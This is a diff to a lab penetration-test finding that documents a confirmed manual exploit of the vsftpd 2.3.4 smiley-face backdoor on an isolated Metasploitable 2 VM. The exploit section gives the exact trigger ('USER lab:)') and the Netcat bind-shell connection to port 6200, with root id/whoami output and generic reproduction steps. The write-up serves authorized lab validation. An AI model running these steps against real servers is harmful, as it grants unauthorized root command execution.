@@ -1,6 +1,6 @@
 # VULN-001 — vsftpd 2.3.4 Backdoor Command Execution
 
-> **Assessment status: FTP service and anonymous access verified; backdoor not yet tested.** Scans from **27 and 28 November 2026** show vsftpd 2.3.4 and Nmap-reported anonymous FTP access. No backdoor exploitation has been performed.
+> **CONFIRMED: CVE-2011-2523 — manual exploitation succeeded on 28 November 2026.** Backdoor triggered over FTP port 21; TCP 6200 opened and executed `id` and `whoami` as `root`. **Metasploit not yet tested.**
 >
 > [← Project home](../../../README.md) · [← Candidate index: NET-001](../../../FINDINGS-INDEX.md#net-001) · [Lab setup](../../../lab-setup/README.md)
 
@@ -19,10 +19,10 @@
 | Service | FTP, TCP 21 |
 | Backdoor listener | TCP 6200 |
 | Possible impact | Unauthenticated **root** command execution |
-| Local validation | **FTP service detected and enumerated; backdoor not tested** |
-| Manual testing | **Not attempted** |
+| Local validation | **Confirmed — root command execution via backdoor port 6200** |
+| Manual testing | **Successful — Telnet FTP trigger + Netcat shell** |
 | Metasploit testing | **Not attempted** |
-| Test date / evidence | **2026-11-27** full scan; **2026-11-28** focused FTP scan ([actual observed terminal transcript](scans/01-FTP-Service-Discovery.txt)); exploit evidence pending |
+| Test date / evidence | **2026-11-28** confirmed manual exploit; [trigger screenshot](screenshots/03-Manual-FTP-Backdoor-Trigger.png), [root proof screenshot](screenshots/04-Manual-Root-Shell-Proof.png), [terminal transcript](scans/04-Manual-vsftpd-Root-Shell.txt) |
 
 ## 2. Explanation and historical incident
 
@@ -91,7 +91,7 @@ The `ftp-syst` response additionally reports a connection from `192.168.95.128`,
 - **Screenshot supplied in conversation (28 November 2026)**, awaiting direct upload as `screenshots/01-FTP-Service-Discovery.png` (do not display a broken image link)
 - [Full-host initial reconnaissance](../../../lab-setup/OPEN-PORTS.md)
 
-**Next stage:** Controlled backdoor validation. Both the baseline TCP 6200 check and anonymous FTP enumeration have been documented.
+**Current state:** Backdoor manually confirmed with root command execution. Next controlled task: test the Metasploit module against a fresh snapshot.
 
 ### 4.2 Pre-exploitation TCP 6200 check — actual result (28 November 2026)
 
@@ -143,38 +143,95 @@ ftp> quit
 
 **Next step:** Manually trigger the backdoor on TCP 21 and independently check whether TCP 6200 opens on the isolated training VM.
 
-## 5. Manual exploitation — Method A: Telnet
+## 5. Confirmed manual exploitation — Telnet + Netcat (28 November 2026)
 
-Telnet is a plain TCP client and can manually interact with the FTP protocol. This is the traditional method in Rapid7's Metasploitable 2 guide.
+**Actual workflow executed on Kali** against the authorized isolated Metasploitable 2 target `192.168.95.131`:
+
+### 5.1 Before triggering — TCP 6200 refused connections
 
 ```bash
-telnet "$TARGET" 21
+nc -nvz 192.168.95.131 6200
+```
+```text
+(UNKNOWN) [192.168.95.131] 6200 (?) : Connection refused
 ```
 
-Type the following into the FTP connection (do not include the `$` shell prompt):
+### 5.2 Trigger the backdoor through FTP port 21
 
+```bash
+telnet 192.168.95.131 21
+```
 ```text
+Connected to 192.168.95.131.
+220 (vsFTPd 2.3.4)
 USER lab:)
+331 Please specify the password.
 PASS test
 ```
 
-Close the FTP session after triggering the backdoor. In a **second Kali terminal**:
+The supplied screenshot ends after `PASS test`; no subsequent FTP reply is visible. The username's `:)` is the historical backdoor trigger.
+
+![Actual Telnet FTP backdoor trigger — screenshot from Kali](screenshots/03-Manual-FTP-Backdoor-Trigger.png)
+
+[View original-terminal screenshot evidence, cropped and converted to black/white for readability](screenshots/03-Manual-FTP-Backdoor-Trigger.png)
+
+### 5.3 Connect to the opened bind shell (Netcat)
 
 ```bash
-telnet "$TARGET" 6200
+nc -nv 192.168.95.131 6200
 ```
 
-Enter harmless proof commands:
+**Actual observed results:**
 
 ```text
+(UNKNOWN) [192.168.95.131] 6200 (?) open
 id
+uid=0(root) gid=0(root)
 whoami
-hostname
-pwd
-exit
+root
+ls
+bin
+boot
+cdrom
+dev
+etc
+home
+...
 ```
 
-Successful `id` output might show `uid=0(root)`; capture **actual**, not assumed, results.
+The screenshot also shows other system-directory names. **Root privileges were verified** using actual `id` and `whoami` output. No command to create users, alter files, download secrets, or establish persistence is visible.
+
+![Actual root bind-shell proof with id and whoami results](screenshots/04-Manual-Root-Shell-Proof.png)
+
+[View root-shell proof screenshot](screenshots/04-Manual-Root-Shell-Proof.png) · [Read the transcribed exploitation output](scans/04-Manual-vsftpd-Root-Shell.txt)
+
+### 5.4 Validation conclusion
+
+**Confirmed:** The observed pre-trigger refusal on TCP 6200, subsequent FTP trigger with `USER lab:)`, successful TCP 6200 connection, and `uid=0(root)` establish successful manual exploitation of the vsftpd 2.3.4 backdoor in this isolated VM.
+
+**Impact demonstrated:** Unauthenticated remote command execution with root privileges. The potential impact includes complete confidentiality, integrity and availability compromise; this controlled demonstration did **not** test data theft, persistence, service disruption, or lateral movement.
+
+**Method limitations:** This confirms the Telnet + Netcat path only. The Python, Socat, Nmap NSE, and Metasploit alternatives are **not yet tested**.
+
+### 5.5 Manual method steps for reproduction
+
+General commands, where `<TARGET_IP>` is the private VM address:
+
+```bash
+telnet <TARGET_IP> 21
+# Enter at the FTP prompt:
+# USER lab:)
+# PASS test
+```
+
+In a second Kali terminal:
+
+```bash
+nc -nv <TARGET_IP> 6200
+# Then: id, whoami
+```
+
+**Reset the target VM from a snapshot before attempting a different method**, to prevent an existing bind shell from being mistaken for a newly triggered backdoor.
 
 ## 6. Manual exploitation — Method B: Netcat
 
@@ -293,15 +350,15 @@ In a genuine environment: remove compromised binaries, reinstall from a trusted 
 - [ ] `screenshots/01-FTP-Service-Discovery.png` — image uploaded to GitHub (screenshot already supplied in chat)
 - [x] `scans/01-FTP-Service-Discovery.txt` — actual FTP discovery terminal transcript
 - [x] `screenshots/02-FTP-Enumeration.png` — actual anonymous FTP login and directory enumeration
-- [ ] `screenshots/03-manual-trigger.png` — actual trigger command and response
-- [ ] `screenshots/03-manual-root-proof.png` — actual `id` output
+- [x] `screenshots/03-Manual-FTP-Backdoor-Trigger.png` — actual trigger command and response
+- [x] `screenshots/04-Manual-Root-Shell-Proof.png` — actual `id` and `whoami` output
 - [ ] `screenshots/04-nmap-nse.png` — optional NSE result
 - [ ] `screenshots/05-metasploit-options.png` — real module/options/payload
 - [ ] `screenshots/06-metasploit-result.png` — real success **or failure** output
 - [ ] `scans/01-ftp-version.nmap` — original scan result
 - [ ] `scans/02-nse-validation.nmap` — optional active validation output
 
-FTP discovery and anonymous enumeration **terminal transcripts have been committed**, and the anonymous-FTP enumeration **PNG screenshot is uploaded**. The earlier FTP discovery PNG is still pending; all exploitation evidence is pending.
+FTP discovery, anonymous enumeration, and manual exploitation **terminal transcripts have been committed**. The anonymous-FTP screenshot and **two genuine manual exploitation screenshot crops** are committed. The earlier FTP discovery PNG is still pending; Metasploit screenshots and results are pending.
 
 ## 14. References
 
@@ -316,4 +373,4 @@ FTP discovery and anonymous enumeration **terminal transcripts have been committ
 
 ---
 
-**Final result: Pending.** Change this to `Investigating` or `Confirmed` only after documenting your own commands, outputs, screenshots, and actual assessment date.
+**Manual validation result: CONFIRMED (2026-11-28).** Root command execution proved using Telnet + Netcat. **Metasploit validation remains pending**.
